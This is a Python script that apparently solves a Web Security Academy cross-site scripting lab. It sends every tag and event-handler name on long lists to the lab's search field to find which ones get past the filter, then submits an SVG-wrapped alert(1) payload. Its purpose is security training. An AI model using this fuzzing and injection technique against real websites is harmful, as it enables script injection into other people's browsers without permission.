import requests
from bs4 import BeautifulSoup

s = requests.Session()


tags = ['a2','abbr','acronym','address','animate',
        'animatemotion','animatetransform','applet',
        'area','article','aside','audio','audio2','b',
        'base','basefont','bdi','bdo','bgsound','big',
        'blink','blockquote','body','br','button',
        'canvas','caption','center','cite','code','col',
        'colgroup','command','content','custom','data',
        'datalist','dd','del','details','dfn','dialog',
        'dir','div','dl','dt','element','em','embed',
        'fieldset','figcaption','figure','font','footer',
        'form','frame','frameset','h1','head','header',
        'hgroup','hr','html','i','iframe','iframe2','image',
        'image2','image3','img','img2','input','input2',
        'input3','input4','ins','isindex','kbd','keygen',
        'label','legend','li','link','listing','main','map',
        'mark','marquee','menu','menuitem','meta','meter',
        'multicol','nav','nextid','nobr','noembed','noframes',
        'noscript','object','ol','optgroup','option','output',
        'p','param','picture','plaintext','pre','progress','q',
        'rb','rp','rt','rtc','ruby','s','samp','script',
        'section','select','set','shadow','slot','small',
        'source','spacer','span','strike','strong','style',
        'sub','summary','sup','svg','table','tbody','td',
        'template','textarea','tfoot','th','thead','time',
        'title','tr','track','tt','u','ul','var','video',
        'video2','wbr','xmp']

allowed_tags = []

events = ['onafterprint','onafterscriptexecute','onanimationcancel',
          'onanimationend','onanimationiteration','onanimationstart',
          'onauxclick','onbeforeactivate','onbeforecopy','onbeforecut',
          'onbeforedeactivate','onbeforepaste','onbeforeprint',
          'onbeforescriptexecute','onbeforeunload','onbegin','onblur',
          'onbounce','oncanplay','oncanplaythrough','onchange','onclick',
          'onclose','oncontextmenu','oncopy','oncuechange','oncut',
          'ondblclick','ondeactivate','ondrag','ondragend','ondragenter',
          'ondragleave','ondragover','ondragstart','ondrop',
          'ondurationchange','onend','onended','onerror','onfinish',
          'onfocus','onfocusin','onfocusout','onfullscreenchange',
          'onhashchange','oninput','oninvalid','onkeydown','onkeypress',
          'onkeyup','onload','onloadeddata','onloadedmetadata','onloadend',
          'onloadstart','onmessage','onmousedown','onmouseenter',
          'onmouseleave','onmousemove','onmouseout','onmouseover',
          'onmouseup','onmousewheel','onmozfullscreenchange','onpagehide',
          'onpageshow','onpaste','onpause','onplay','onplaying',
          'onpointerdown','onpointerenter','onpointerleave','onpointermove',
          'onpointerout','onpointerover','onpointerrawupdate','onpointerup',
          'onpopstate','onprogress','onreadystatechange','onrepeat','onreset',
          'onresize','onscroll','onsearch','onseeked','onseeking','onselect',
          'onselectionchange','onselectstart','onshow','onstart','onsubmit',
          'ontimeupdate','ontoggle','ontouchend','ontouchmove','ontouchstart',
          'ontransitioncancel','ontransitionend','ontransitionrun',
          'ontransitionstart','onunhandledrejection','onunload','onvolumechange',
          'onwaiting','onwebkitanimationend','onwebkitanimationiteration',
          'onwebkitanimationstart','onwebkittransitionend','onwheel']

allowed_events = []

site = 'acf71fbe1ffbae65c0bc0b8c003200b3.web-security-academy.net'

# tag = 'script'
# search_url = f'https://{site}/?search=<{tag}>'
# resp = s.get(search_url)
# print(f'Status code is {resp.status_code} with response text {resp.text}')

def test_tags():
    for tag in tags:
        search_url = f'https://{site}/?search=<{tag}>'
        resp = s.get(search_url)
        print(f'testing {tag}')
        if resp.status_code == 200:
            print(f'{tag} is allowed.')
            allowed_tags.append(tag)

    for tag in allowed_tags:
        print(f'{tag}', sep=', ')

def test_events(tag_test):
    for event in events:
        search_url = f'https://{site}/?search=<{tag_test} {event}>'
        resp = s.get(search_url)
        print(f'testing {event}')
        if resp.status_code == 200:
            print(f'{event} is allowed.')
            allowed_events.append(event)

    print("Events allowed:")
    for event in allowed_events:
        print(f'{event}', sep=', ')

def solve(tag_solve, event_solve):
    search_term = f'''<svg><{tag_solve} {event_solve}=alert(1)>'''
    search_url = f'https://{site}/?search=<{search_term}>'
    # search_url1 = f'https://{site}/?search=<animatetransform onbegin=alert(1)>'
    resp = s.get(search_url)
    print(f'{resp.status_code}')

if __name__ == '__main__':
    print("1. Test Tags")
    print("2. Test Events")
    print("3. Solve Level")
    
    val = input("")

    if(val == '1'):
        print("Testing Tags")
        test_tags()
    elif(val == '2'):
        tag_test = input("Enter a tag to test: ")
        print("Testing Events.")
        test_events(tag_test)
    elif(val == '3'):
        tag_solve = input("Enter a tag to solve: ")
        event_solve = input("Enter an Event to solve: ")
        solve(tag_solve, event_solve)
    else: 
        print("Error")
